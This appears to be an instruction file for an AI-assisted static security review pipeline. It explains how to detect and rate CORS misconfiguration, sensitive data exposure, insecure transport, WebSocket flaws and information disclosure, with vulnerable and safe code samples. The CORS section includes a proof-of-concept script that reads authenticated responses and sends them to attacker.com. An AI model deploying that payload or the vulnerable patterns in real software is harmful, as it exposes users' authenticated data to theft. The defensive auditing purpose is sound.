# Insecure Communication & Misconfiguration Skill — flow-sast Phase 4

Scope: insecure HTTP, insecure WebSocket, CORS misconfiguration,
misconfiguration, sensitive data in response, information disclosure.

---

## 1. CORS Misconfiguration

**VULNERABLE**:
```python
# Wildcard with credentials
response.headers['Access-Control-Allow-Origin'] = '*'
response.headers['Access-Control-Allow-Credentials'] = 'true'   # NOT allowed with *

# Reflected Origin — trusts any origin
origin = request.headers.get('Origin')
response.headers['Access-Control-Allow-Origin'] = origin         # reflects any origin
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

**SAFE**: explicit origin allowlist.
```python
ALLOWED_ORIGINS = {'https://app.example.com', 'https://admin.example.com'}
if origin in ALLOWED_ORIGINS:
    response.headers['Access-Control-Allow-Origin'] = origin
```

**Verify**: `Access-Control-Allow-Origin` = reflected value or `*` + `Allow-Credentials: true`.

**Exploit**: if credentials allowed + origin reflected → read authenticated responses cross-origin.
```html
<script>
fetch('https://target.com/api/me', {credentials: 'include'})
  .then(r => r.text()).then(d => fetch('https://attacker.com?d=' + btoa(d)));
</script>
```

---

## 2. Sensitive Data in Response

**Primary input (Phase 3 Verify)**:
- Verified path from `connect/joern_annotated_paths.json` (reverse taint: DB model → JSON response):
  - `path.entry` — endpoint/controller returning data (file:line)
  - `path.sink` — serialization call (`jsonify`, `res.json()`, `to_json()`, `Response.Write`, etc.)
  - `path.flow_nodes[]` — call chain from model fetch → serialization; look for explicit field filtering
  - `path.vuln_type` — `sensitive_data`
  - `path.path_decision` — verify depth

**Supplementary context (catalog)**:
- `catalog/data_models.json` → `sensitive_fields[]` — regex pre-tagged fields (password, ssn, balance, token, is_admin…)
- `catalog/sinks.json` → serialization sinks: `jsonify`, `res.json()`, `echo`, `to_json()`, `Response.Write`
- Flow direction: model object → serialization sink → response — OPPOSITE of injection/mass_assign

**Field identification — two layers**:

*Layer 1 — Regex pre-tagged* (`sensitive_fields[]` in data_models.json):
- Already flagged by static patterns: `password*`, `*_hash`, `ssn`, `balance`, `token`, `is_admin`...
- High confidence, use directly.

*Layer 2 — Claude semantic review* (scan `fields[]` list yourself):
- Read ALL fields in `fields[]`, not just `sensitive_fields[]`
- Flag anything that looks sensitive by domain context, even if not in regex list:
  - Healthcare: `diagnosis`, `prescription`, `medical_record_id`, `lab_result`, `genetic_info`, `therapy_notes`
  - Finance: `transaction_pin`, `wire_routing`, `tax_id`, `ein`
  - Identity/legal: `driving_license`, `passport_number`, `voter_id`, `case_number`
  - Internal system: `internal_score`, `fraud_flag`, `risk_level`, `audit_log`
  - Business-specific (from `business_ctx.sensitive_flows`): any field the context file flags as sensitive
- Add these to your finding as "Claude-identified sensitive fields" — separate from regex list.

**Check**:
- Fields from either layer appearing in full model serialization
- Error messages expose stack traces, SQL queries, internal paths
- Debug endpoints accessible in production: `/debug`, `/actuator`, `/_profiler`, `/telescope`

**VULNERABLE**:
```python
return jsonify(user.__dict__)          # includes password_hash, internal fields
return jsonify({"error": str(e)})      # stack trace in response
```

**SAFE**:
```python
return jsonify({"id": user.id, "name": user.name, "email": user.email})  # explicit fields
```

**Verify from flow_nodes**: trace model object → serialization call.
- `__dict__` / `to_json()` / `serialize()` on a model with sensitive fields → HIGH
- Explicit field selection (`{"id": x, "name": y}`) → FALSE POSITIVE
- Check if response DTO/serializer class excludes sensitive fields

---

## 3. Insecure HTTP / Transport

**Check**:
- `http://` hardcoded in API calls (mixed content)
- Missing `Strict-Transport-Security` header
- Cookies without `Secure` flag sent over HTTP
- TLS version: TLS 1.0/1.1 still accepted

**VULNERABLE**:
```python
requests.get('http://internal-api/endpoint')      # non-HTTPS internal call
response.set_cookie('session', value)             # missing Secure + HttpOnly + SameSite
```

**SAFE**:
```python
response.set_cookie('session', value, secure=True, httponly=True, samesite='Lax')
```

---

## 4. Insecure WebSocket

**Check**:
- Missing `Origin` header validation → cross-site WebSocket hijacking
- No auth token required on WS connection
- Sensitive data over `ws://` (non-TLS)

**VULNERABLE**:
```js
const ws = new WebSocket('ws://app.com/socket');  // not TLS
// Server side — no origin check:
wss.on('connection', (ws) => { ... })             // accepts any origin
```

**SAFE**:
```js
wss.on('connection', (ws, req) => {
    const origin = req.headers['origin'];
    if (!ALLOWED_ORIGINS.includes(origin)) { ws.close(); return; }
})
```

---

## 5. Misconfiguration

**Common findings**:
- Default credentials left in config (`admin:admin`, `root:root`)
- Debug mode enabled in production (`DEBUG=True`, `app.debug = True`)
- Unnecessary HTTP methods enabled (`TRACE`, `PUT` on non-API endpoints)
- Directory listing enabled (web server `autoindex on`)
- Overly permissive file permissions on secrets files

**Verify**: check config files flagged by `secrets_scan` and `repo_intel` for debug flags, default passwords, permissive settings.

---

## 6. Information Disclosure

**Sources**:
- Version headers: `Server: Apache/2.4.1`, `X-Powered-By: PHP/7.2.0`
- Error pages with internal paths, class names, SQL errors
- `.git` directory accessible at web root → full source code
- `.env` file accessible: `GET /.env`
- Backup files: `config.php.bak`, `database.sql`

**Verify**: check if error handling returns raw exceptions vs. sanitized messages.

---

## Confidence Calibration

| Scenario | Confidence |
|---|---|
| CORS reflects Origin + `Allow-Credentials: true` | HIGH |
| CORS `*` without credentials | LOW (no auth data exposed) |
| `user.__dict__` in JSON response, model has `sensitive_fields` | HIGH |
| `user.__dict__` in JSON response, no sensitive fields | MEDIUM |
| Explicit field selection in response | FALSE POSITIVE |
| DTO/serializer class that excludes sensitive fields | FALSE POSITIVE |
| `DEBUG=True` in production config | HIGH |
| Cookie missing `Secure` on HTTPS app | MEDIUM |
